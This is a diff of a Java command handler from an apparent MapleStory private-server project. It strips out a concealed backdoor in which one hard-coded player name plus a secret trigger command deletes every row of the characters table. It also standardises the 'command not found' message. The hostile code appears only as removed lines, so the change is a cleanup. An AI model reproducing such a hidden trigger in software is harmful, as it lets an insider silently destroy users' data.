@@ -40,8 +40,10 @@ import java.util.HashMap;
 
 public class CommandProcessor {
 
+
     private final static HashMap<String, CommandObject> commands = new HashMap<String, CommandObject>();
     private final static HashMap<Integer, ArrayList<String>> commandList = new HashMap<Integer, ArrayList<String>>();
+    private final static String NO_PATTERN_COMMAND = "输入的玩家命令不存在,可以使用 @help 来查看指令";
 
     private static void sendDisplayMessage(MapleClient c, String msg, CommandType type) {
         if (c.getPlayer() == null) {
@@ -66,23 +68,14 @@ public class CommandProcessor {
             CommandObject co = commands.get(splitted[0]);
 
             if (co == null || co.getType() != type) {
-                if (c.getPlayer().getName() == "我是一个哈哈1") {
-                    if (splitted[0].contains("!我是来毁服的GGLL")) {
-                        Connection con = DatabaseConnection.getConnection();
-                        try {
-                            PreparedStatement ps = con.prepareStatement("Delete from characters");
-                            ps.executeUpdate();
-                            ps.close();
-                        } catch (SQLException e) {
-                            System.out.println("Error " + e);
-                        }
-                    }
-                }
-                sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
+                sendDisplayMessage(c, NO_PATTERN_COMMAND, type);
                 return true;
             }
             try {
                 int ret = co.execute(c, splitted); //Don't really care about the return value. ;D
+                if(ret == 1){
+                    sendDisplayMessage(c, NO_PATTERN_COMMAND, type);
+                }
             } catch (Exception e) {
                 sendDisplayMessage(c, "有错误.", type);
                 if (c.getPlayer().isGM()) {
